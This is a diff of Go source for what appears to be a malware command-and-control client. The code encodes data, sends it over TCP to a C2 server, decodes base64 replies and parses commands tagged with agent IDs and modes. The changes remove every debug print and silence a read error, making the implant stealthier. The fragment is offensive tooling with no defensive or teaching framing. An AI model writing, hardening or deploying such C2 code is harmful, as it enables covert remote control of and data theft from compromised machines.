@@ -55,7 +55,6 @@ var OBFTEXT = "test"
 //blast payload out to C2, listen to response
 func sendData(data string, mode string, aid string) string {
 	payload := encodePayload(data, mode, aid)
-	fmt.Printf("sending: %s\n", payload)
 	conn, err := net.Dial("tcp4", serv)
 	if err != nil {
 		panic(err)
@@ -64,7 +63,7 @@ func sendData(data string, mode string, aid string) string {
 	conn.Write(outText)
 	message, err := bufio.NewReader(conn).ReadString(MAGICTERMBYTE)
 	if err != nil {
-		fmt.Println("Error reading:", err.Error())
+		return "0:0:0"
 	}
 	respStr := string(message)
 	decResp := decodePayload(respStr)
@@ -86,7 +85,6 @@ func decodePayload(payload string) string {
 	encodedPayload = strings.Replace(encodedPayload, MAGICTERMSTR, "", -1)
 	data, err := base64.StdEncoding.DecodeString(encodedPayload)
 	if err != nil {
-		fmt.Println("error:", err)
 		return ""
 	}
 	return string(data)
@@ -130,7 +128,6 @@ func parseCommands(commandBlob string) []string {
 	isplit := strings.Split(commandBlob, "<||>")
 	for _, comStr := range isplit {
 		jsplit := strings.SplitN(comStr, ":", 3)
-		fmt.Println(jsplit)
 		aid := jsplit[0]
 		mode := jsplit[1]
 		if mode == "0" {
